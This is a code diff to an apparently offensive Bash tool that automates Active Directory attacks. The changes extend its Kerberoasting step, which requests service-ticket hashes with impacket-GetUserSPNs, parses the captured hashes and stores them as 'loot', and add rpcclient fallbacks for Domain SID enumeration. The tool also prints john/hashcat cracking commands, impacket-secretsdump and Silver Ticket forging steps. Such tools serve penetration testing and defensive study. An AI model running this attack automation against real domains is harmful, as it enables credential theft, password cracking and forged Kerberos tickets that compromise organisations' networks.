@@ -258,6 +258,10 @@ BADSUCCESSOR_EVIDENCE=""
 declare -a BADSUCCESSOR_APPLICABLE_TRUSTEES=()
 KERBEROAST_HASH_FOUND=false     # Set when Kerberoast output is non-empty
 SPN_NAME=""                     # Parse from Kerberoast result
+KERBEROAST_USER=""
+declare -a KERBEROAST_TARGETS=()
+declare -a SPN_LIST=()
+declare -a SPN_USER_LIST=()
 BH_ZIP_FILE=""
 ENABLE_DNS_ENUM=false
 DNS_BRUTE=false
@@ -666,6 +670,9 @@ create_local_kerberos_ccache() {
     info "Creating local Kerberos ccache for ${principal}"
     echo -e "     ${YELLOW}${ICON_TIP} Copy/Paste equivalent:${RESET}"
     echo -e "        ${GREEN}printf '%s\n' '$AUTH_PASS' | kinit -c '$ccache_file' '$principal'${RESET}"
+    echo 
+    echo -e "     ${YELLOW}${ICON_TIP} Copy/Paste equivalent:${RESET}"
+    echo -e "        ${GREEN}export KRB5CCNAME=$ccache_file${RESET}"
 
     rm -f "$ccache_file"
 
@@ -1544,6 +1551,106 @@ detect_kerberos_clock_skew() {
     return 1
 }
 
+parse_getuserspns_output() {
+    local enumeration_output="${1:-}"
+    local preferred_spn=""
+
+    [[ -n "$enumeration_output" ]] || return 1
+
+    # Parse only table rows whose first column has SPN syntax. This excludes
+    # Impacket banners, status messages, headers, and the dashed separator.
+    mapfile -t SPN_LIST < <(
+        printf '%s\n' "$enumeration_output" |
+            awk '$1 ~ /^[[:alnum:]_.-]+\/[[:alnum:]_.-]+/ {print $1}' |
+            sort -u
+    )
+    mapfile -t SPN_USER_LIST < <(
+        printf '%s\n' "$enumeration_output" |
+            awk '$1 ~ /^[[:alnum:]_.-]+\/[[:alnum:]_.-]+/ && $2 != "" {print $2}' |
+            sort -u
+    )
+
+    [[ ${#SPN_LIST[@]} -gt 0 ]] || return 1
+
+    KERBEROAST_TARGETS=("${SPN_LIST[@]}")
+
+    # Prefer an SPN belonging to the account named in the captured hash. When
+    # more than one exists, the sorted no-port form is selected first.
+    if [[ -n "$KERBEROAST_USER" ]]; then
+        preferred_spn=$(
+            printf '%s\n' "$enumeration_output" |
+                awk -v user="$KERBEROAST_USER" '
+                    $1 ~ /^[[:alnum:]_.-]+\/[[:alnum:]_.-]+/ &&
+                    tolower($2) == tolower(user) {print $1}
+                ' | sort -u | head -n 1
+        )
+    fi
+    SPN_NAME="${preferred_spn:-${SPN_LIST[0]}}"
+
+    if [[ -z "$KERBEROAST_USER" ]]; then
+        KERBEROAST_USER=$(
+            printf '%s\n' "$enumeration_output" |
+                awk -v spn="$SPN_NAME" '$1 == spn {print $2; exit}'
+        )
+    fi
+
+    success "Authoritative Kerberoast SPN selected: ${SPN_NAME}"
+    return 0
+}
+
+parse_kerberoast_metadata() {
+    local hash_file="${1:-}"
+
+    [[ -n "$hash_file" && -s "$hash_file" ]] || return 1
+    grep -Fq "\$krb5tgs\$" "$hash_file" || return 1
+
+    # Impacket stores both RC4 and AES hashes as dollar-delimited fields. The
+    # username is field 4 and the SPN is field 6; depending on the encryption
+    # type, either value can be wrapped in asterisks. Impacket also replaces
+    # colons in SPNs with tildes for hashcat compatibility.
+    KERBEROAST_USER=$(awk -F'$' '
+        $2 == "krb5tgs" {
+            value=$4
+            sub(/^\*/, "", value)
+            print value
+            exit
+        }
+    ' "$hash_file")
+
+    SPN_NAME=$(awk -F'$' '
+        $2 == "krb5tgs" {
+            value=$6
+            sub(/^\*/, "", value)
+            sub(/\*$/, "", value)
+            gsub(/~/, ":", value)
+            print value
+            exit
+        }
+    ' "$hash_file")
+
+    mapfile -t KERBEROAST_TARGETS < <(
+        awk -F'$' '
+            $2 == "krb5tgs" {
+                value=$6
+                sub(/^\*/, "", value)
+                sub(/\*$/, "", value)
+                gsub(/~/, ":", value)
+                if (value != "") print value
+            }
+        ' "$hash_file" | sort -u
+    )
+
+    KERBEROAST_HASH_FOUND=true
+
+    if [[ -z "$KERBEROAST_USER" || -z "$SPN_NAME" ]]; then
+        warn "Kerberoast hash found, but username or SPN metadata could not be parsed from $hash_file"
+        return 0
+    fi
+
+    success "Kerberoast metadata parsed: ${KERBEROAST_USER} -> ${SPN_NAME}"
+    return 0
+}
+
 ldap_enum() {
     local USE_AUTH="$1"
     local PASSED_DOMAIN="${2:-}"
@@ -2015,31 +2122,15 @@ ldap_enum() {
     if [[ -f "$KERBEROAST_OUT" && -s "$KERBEROAST_OUT" ]]; then
         success "Kerberoastable accounts identified"
         success "Kerberoast hashes saved to: ${BLUE}$KERBEROAST_OUT${RESET}"
-        KERBEROAST_HASH_FOUND=true     
-                             # Parse from Kerberoast result
-
-        # Optional: extract principals for on-screen display
-        mapfile -t KERBEROAST_TARGETS < <(
-            grep -E '^\$krb5tgs\$' "$KERBEROAST_OUT" \
-                | awk -F':' '{print $NF}' \
-                | sort -u
-        )
-        
-        # Extract Kerberoast SPN and user (samAccountName)
-        KERBEROAST_USER=$(grep -oP '\$krb5tgs\$[^\$]+\$\K[^$]+' "$KERBEROAST_OUT" | head -n 1)
-        # Extract SPN from first line of Kerberoast hash file
-        SPN_NAME=$(head -n 1 "$KERBEROAST_OUT" | awk -F'\$' '{print $6}' | awk -F'*' '{print $2}')
+        parse_kerberoast_metadata "$KERBEROAST_OUT" || true
         
         # Run impacket-GetUserSPNs and parse SPNs into array
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}impacket-GetUserSPNs '$LDAP_BASE_DN//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER${RESET}"
-        SPN_ENUM_OUTPUT=$(impacket-GetUserSPNs "$LDAP_DOMAIN//$AUTH_USER:$AUTH_PASS" -k -dc-ip "$TARGET_IPV4" -dc-host "$DOMAIN_CONTROLLER" 2>/dev/null)
-        mapfile -t SPN_LIST < <(echo "$SPN_ENUM_OUTPUT" | awk '/^[^ ]/ && $1 ~ /\// {print $1}' | sort -u)
-        mapfile -t SPN_USER_LIST < <(echo "$SPN_ENUM_OUTPUT" | awk '/^[^ ]/ && $1 ~ /\// {print $2}' | sort -u)
+        echo -e "        ${GREEN}impacket-GetUserSPNs '${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER${RESET}"
+        SPN_ENUM_OUTPUT=$(impacket-GetUserSPNs "${LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" -k -dc-ip "$TARGET_IPV4" -dc-host "$DOMAIN_CONTROLLER" 2>/dev/null)
 
-        if [[ ${#SPN_LIST[@]} -gt 0 ]]; then
+        if parse_getuserspns_output "$SPN_ENUM_OUTPUT"; then
             print_section "Service Principal Names (via GetUserSPNs):" "${SPN_LIST[@]}"
-             SPN_NAME="${SPN_LIST[0]}"
         else
             warn "No SPNs found via GetUserSPNs"
         fi
@@ -3468,44 +3559,171 @@ check_ntlm_support() {
 }
 
 get_domain_sid() {
-    local domain_user="$1"
-    local password="$2"
-    local target_domain_controller="$3"
-    local ntlm_on="$4"  # optional: pass "true" to use -k
+    local domain_user="${1:-}"
+    local password="${2:-}"
+    local target_domain_controller="${3:-}"
+    local ntlm_on="${4:-${NTLM_ENABLED:-false}}"
+    local lookup_user="${domain_user##*/}"
+    local sid_output=""
+    local rpc_output=""
+    local resolved_account_sid=""
+    local l_domain_sid=""
+    local sid_source=""
+    local kerberos_ccache=""
+    local loot_domain="${AUTH_DOMAIN:-${LDAP_DOMAIN:-${KERB_REALM:-unknown}}}"
+    local safe_dc=""
+    local sid_evidence_file=""
+    local rpc_transport_open=false
+    local kerberos_detected=false
+
+    # DOMAIN/user and DOMAIN\user are both accepted by the caller. rpcclient's
+    # lookupnames command needs only the account name.
+    lookup_user="${lookup_user##*\\}"
+
     echo
-    # Ensure lookupsid.py exists in PATH
-    if ! command -v impacket-lookupsid >/dev/null 2>&1; then
-        warn "impacket-lookupsid not found in PATH. Install Impacket or add to PATH."
-        return 1
-    fi
-    
-    local sid_output
-    local l_domain_sid
-    
     info "Enumerating Domain SID for $target_domain_controller with user $domain_user..."
 
-    if [[ "$ntlm_on" == "true" ]]; then
-        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}impacket-lookupsid ${domain_user}:${password}@${target_domain_controller}${RESET}"
-        
-        sid_output=$(impacket-lookupsid "$domain_user:$password@$target_host"  2>/dev/null)
-    else
-        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}impacket-lookupsid ${domain_user}:${password}@${target_domain_controller} -k${RESET}"
-        sid_output=$(impacket-lookupsid "$domain_user:$password@$target_domain_controller" -k 2>/dev/null)
+    # rpcclient uses SMB named-pipe RPC, so TCP 139 or 445 is required. TCP 135
+    # alone only exposes the RPC endpoint mapper and is not a usable transport
+    # for rpcclient.
+    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -Eq '^(139|445)$'; then
+        rpc_transport_open=true
     fi
 
-    l_domain_sid=$(echo "$sid_output" | grep -i "Domain SID is:" | awk -F': ' '{print $2}')
+    # Reuse the scan/authentication results already collected by the script.
+    if [[ "${HAS_KERB:-0}" == "1" || "${KERB_DETECTED:-false}" == true ||
+          "${KERBEROS_FOUND:-false}" == true || "${KERBEROS_AUTH_OK:-false}" == true ]]; then
+        kerberos_detected=true
+    fi
+
+    # rpcclient --use-krb5-ccache needs a real, non-expired cache. Prefer the
+    # explicit KRB5CCNAME, but also support the default cache reported by klist.
+    if command -v klist >/dev/null 2>&1 && klist -s >/dev/null 2>&1; then
+        kerberos_ccache="${KRB5CCNAME:-}"
+        if [[ -z "$kerberos_ccache" ]]; then
+            kerberos_ccache=$(klist 2>/dev/null | sed -n 's/^Ticket cache:[[:space:]]*//p' | head -n 1)
+        fi
+    fi
+
+    # kerberos_auth_check validates the credentials and then destroys its test
+    # ticket. Recreate a reusable cache when Kerberos auth was confirmed and no
+    # usable cache is currently present.
+    if $kerberos_detected && [[ -z "$kerberos_ccache" ]] &&
+       [[ "${KERBEROS_AUTH_OK:-false}" == true ]] &&
+       declare -F create_local_kerberos_ccache >/dev/null 2>&1; then
+        info "Kerberos is available, but no usable ccache is loaded; creating one for SID lookup"
+        create_local_kerberos_ccache || true
+        if command -v klist >/dev/null 2>&1 && klist -s >/dev/null 2>&1; then
+            kerberos_ccache="${KRB5CCNAME:-}"
+            if [[ -z "$kerberos_ccache" ]]; then
+                kerberos_ccache=$(klist 2>/dev/null | sed -n 's/^Ticket cache:[[:space:]]*//p' | head -n 1)
+            fi
+        fi
+    fi
+
+    # Keep impacket-lookupsid as the primary method. Unlike the old code, a
+    # missing command or failed lookup now falls through to rpcclient.
+    if command -v impacket-lookupsid >/dev/null 2>&1; then
+        if [[ "$ntlm_on" == true ]]; then
+            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+            echo -e "        ${GREEN}impacket-lookupsid ${domain_user}:${password}@${target_domain_controller}${RESET}"
+            sid_output=$(impacket-lookupsid "$domain_user:$password@$target_domain_controller" 2>&1 || true)
+        elif [[ -n "$kerberos_ccache" ]]; then
+            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+            echo -e "        ${GREEN}impacket-lookupsid ${domain_user}@${target_domain_controller} -k -no-pass${RESET}"
+            sid_output=$(impacket-lookupsid "$domain_user@$target_domain_controller" -k -no-pass 2>&1 || true)
+        else
+            note "NTLM is unavailable and no usable Kerberos ccache was found for impacket-lookupsid"
+        fi
+
+        l_domain_sid=$(printf '%s\n' "$sid_output" |
+            sed -nE 's/.*[Dd]omain SID is:[[:space:]]*(S-1(-[0-9]+)+).*/\1/p' |
+            head -n 1)
+        [[ -n "$l_domain_sid" ]] && sid_source="impacket-lookupsid"
+    else
+        note "impacket-lookupsid not found; trying rpcclient fallback"
+    fi
+
+    if [[ -z "$l_domain_sid" ]] && $rpc_transport_open; then
+        if ! command -v rpcclient >/dev/null 2>&1; then
+            warn "rpcclient not found in PATH; cannot run the SID fallback"
+        else
+            # Prefer a usable Kerberos cache when one is available. If the
+            # Kerberos lookup fails and NTLM is enabled, retry with credentials.
+            if [[ -n "$kerberos_ccache" ]]; then
+                info "Trying rpcclient Domain SID lookup with Kerberos ccache"
+                echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+                echo -e "        ${GREEN}printf 'lookupnames %s\\nexit\\n' '$lookup_user' | rpcclient '$target_domain_controller' --use-krb5-ccache='$kerberos_ccache'${RESET}"
+                rpc_output=$(printf 'lookupnames %s\nexit\n' "$lookup_user" |
+                    rpcclient "$target_domain_controller" "--use-krb5-ccache=$kerberos_ccache" 2>&1 || true)
+                resolved_account_sid=$(printf '%s\n' "$rpc_output" |
+                    awk 'match($0, /S-1(-[0-9]+)+/) { print substr($0, RSTART, RLENGTH); exit }')
+
+                if [[ -n "$resolved_account_sid" ]]; then
+                    l_domain_sid="${resolved_account_sid%-*}"
+                    sid_source="rpcclient (Kerberos)"
+                fi
+            elif $kerberos_detected; then
+                note "Kerberos was detected, but rpcclient cannot use it without a valid ccache"
+            fi
+
+            if [[ -z "$l_domain_sid" && "$ntlm_on" == true ]]; then
+                info "Trying rpcclient Domain SID lookup with password/NTLM authentication"
+                echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+                echo -e "        ${GREEN}printf 'lookupnames %s\\nexit\\n' '$lookup_user' | rpcclient '$target_domain_controller' -U '${domain_user}%${password}'${RESET}"
+                rpc_output=$(printf 'lookupnames %s\nexit\n' "$lookup_user" |
+                    rpcclient "$target_domain_controller" -U "$domain_user%$password" 2>&1 || true)
+                resolved_account_sid=$(printf '%s\n' "$rpc_output" |
+                    awk 'match($0, /S-1(-[0-9]+)+/) { print substr($0, RSTART, RLENGTH); exit }')
+
+                if [[ -n "$resolved_account_sid" ]]; then
+                    l_domain_sid="${resolved_account_sid%-*}"
+                    sid_source="rpcclient (password/NTLM)"
+                fi
+            elif [[ -z "$l_domain_sid" && "$ntlm_on" != true ]]; then
+                note "NTLM is unavailable; skipping the non-Kerberos rpcclient fallback"
+            fi
+        fi
+    elif [[ -z "$l_domain_sid" ]]; then
+        if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx '135'; then
+            note "TCP 135 is open, but rpcclient requires SMB RPC over TCP 139 or 445"
+        else
+            note "SMB RPC transport is unavailable (TCP 139/445 not open); skipping rpcclient fallback"
+        fi
+    fi
 
     if [[ -n "$l_domain_sid" ]]; then
-        success "Domain SID found: ${BLUE}$l_domain_sid${RESET}"
+        success "Domain SID found via $sid_source: ${BLUE}$l_domain_sid${RESET}"
+
+        # Preserve the original flat-file artifact for compatibility, and also
+        # feed the result into the initialized evidence/loot framework.
         echo "$l_domain_sid" > "domain_sid_${target_domain_controller}.txt"
-        DOMAIN_SID=$l_domain_sid
-    else
-        warn "Failed to extract Domain SID."
-        echo "$sid_output" > "lookupsid_debug_${target_domain_controller}.log"
+        DOMAIN_SID="$l_domain_sid"
+
+        safe_dc="$(sanitize_name "$target_domain_controller")"
+        sid_evidence_file="${EVIDENCE_DIR:-.}/domain_sid_${safe_dc}.txt"
+        {
+            echo "collected_at=$(date -Is)"
+            echo "domain=$loot_domain"
+            echo "domain_controller=$target_domain_controller"
+            echo "lookup_account=$lookup_user"
+            [[ -n "$resolved_account_sid" ]] && echo "account_sid=$resolved_account_sid"
+            echo "domain_sid=$l_domain_sid"
+            echo "source=$sid_source"
+        } > "$sid_evidence_file"
+
+        record_loot "domain_sid" "$loot_domain $l_domain_sid" "$sid_evidence_file"
+        success "Domain SID loot recorded in: ${BYELLOW}$LOOT_INDEX_FILE${RESET}"
+        success "Domain SID evidence saved to: ${BYELLOW}$sid_evidence_file${RESET}"
+        return 0
     fi
+
+    warn "Failed to extract Domain SID."
+    [[ -n "$sid_output" ]] && echo "$sid_output" > "lookupsid_debug_${target_domain_controller}.log"
+    [[ -n "$rpc_output" ]] && echo "$rpc_output" > "rpcclient_sid_debug_${target_domain_controller}.log"
+    return 1
 }
+
 
 dns_enum() {
     local dns_server="${1:-$TARGET_IPV4}"
@@ -5640,7 +5858,7 @@ fi
 
 # Check for & get Domain SID
 if (( HAS_SMB == 1 )) && [[ "$CREDS_PROVIDED" == true && "$SMB_AUTH_OK" == true && -n "$DOMAIN_CONTROLLER" ]]; then
-    get_domain_sid "${AUTH_DOMAIN:-$LDAP_DOMAIN}/$AUTH_USER" "$AUTH_PASS" "$DOMAIN_CONTROLLER" "$NTLM_ENABLED"
+    get_domain_sid "${AUTH_DOMAIN:-$LDAP_DOMAIN}/$AUTH_USER" "$AUTH_PASS" "$DOMAIN_CONTROLLER" "$NTLM_ENABLED" || true
 fi
 
 ###########################################
@@ -5911,12 +6129,7 @@ if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -e
 
     echo
 
-    if [[ ! -s "$KERBEROAST_FILE" ]]; then
-        warn "Kerberoast skipped — no SPNs detected during LDAP enumeration"
-        lightbulb "Ensure users have servicePrincipalName attributes"
-        lightbulb "Check manually: ldapsearch '(servicePrincipalName=*)'"
-        return 0
-    fi
+    KERBEROAST_FILE="${LOOT_DIR:-.}/kerberoast_$(sanitize_name "$TARGET_IPV4")_$(date +%Y%m%d_%H%M%S).txt"
 
     alert "Kerberoast Candidates Identified"
     info  "Attempting Kerberoast via Impacket"
@@ -5925,27 +6138,31 @@ if [[ "$ENABLE_KERBROAST" == true && "$CREDS_PROVIDED" == true && "$HAS_KERB" -e
     echo
 
     # Run Kerberoast safely and capture output
+    KERB_EXIT=0
     KERB_OUTPUT=$(impacket-GetUserSPNs \
         "${AUTH_DOMAIN:-$LDAP_DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
         -dc-ip "$TARGET_IPV4" \
         -request \
-        -outputfile "$KERBEROAST_FILE" 2>&1)
-    KERB_EXIT=$?
+        -outputfile "$KERBEROAST_FILE" 2>&1) || KERB_EXIT=$?
 
     # Always show Impacket output
     echo "$KERB_OUTPUT"
     echo
 
-    if grep -q '\$krb5tgs\$' "$KERBEROAST_FILE"; then
+    if parse_kerberoast_metadata "$KERBEROAST_FILE"; then
+        parse_getuserspns_output "$KERB_OUTPUT" ||
+            warn "Hashes were captured, but authoritative SPNs could not be parsed from GetUserSPNs output"
         success "Success! Kerberoast Hashes Captured!"
         info "Saved to: ${BYELLOW}$KERBEROAST_FILE${RESET}"
+        record_loot "kerberoast_hashes" "${KERBEROAST_USER} ${SPN_NAME:-SPN-unresolved}" "$KERBEROAST_FILE"
         echo -e "    Crack with: "
         echo -e "        john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs $KERBEROAST_FILE"
         echo -e "            Or "
         echo -e "        hashcat -m 13100 $KERBEROAST_FILE /usr/share/wordlists/rockyou.txt --show"
         echo
     else
-    	warn "Kerberoast Attempt Failed!"
+	    warn "Kerberoast Attempt Failed!"
+        [[ "$KERB_EXIT" -ne 0 ]] && note "impacket-GetUserSPNs exited with status $KERB_EXIT"
         
         if echo "$KERB_OUTPUT" | grep -qi "KRB_AP_ERR_SKEW"; then
             lightbulb "Clock skew detected"
@@ -6595,7 +6812,9 @@ attack_path_evaluation() {
     fi
     
     # 6. Kerberoast
-    if [[ "$KERBEROAST_HASH_FOUND" == true ]] && [[ "$NTLM_DISABLED" == true ]] && [[ -n "$SPN_NAME" ]]; then
+    if [[ "${KERBEROAST_HASH_FOUND:-false}" == true ]] &&
+       [[ "${NTLM_DISABLED:-false}" == true ]] &&
+       [[ -n "${SPN_NAME:-}" ]]; then
         echo ""
         critical "Attack Path: Silver Ticket Attack is Viable"
         lightbulb "Next Steps:"
@@ -6604,7 +6823,7 @@ attack_path_evaluation() {
         echo -e "   - Acquire the NTLM hash for the pwned SPN Account."
         echo -e "         ${GREEN}impacket-secretsdump ${AUTH_DOMAIN:-$LDAP_DOMAIN}/$KERBEROAST_USER:[CrackedPassword]@$TARGET_IPV4"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}//$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER ${RESET}"
+        echo -e "        ${GREEN}impacket-GetUserSPNs '${AUTH_DOMAIN:-$LDAP_DOMAIN}/$AUTH_USER:$AUTH_PASS' -k -dc-ip $TARGET_IPV4 -dc-host $DOMAIN_CONTROLLER -request${RESET}"
         echo -e "                   OR "
         echo -e "        ${GREEN}ntlmhashgen.py -u [target_user] -p [CrackedPassword] ${RESET}"
         echo -e "   - Use the hash to forge a Silver Ticket:"
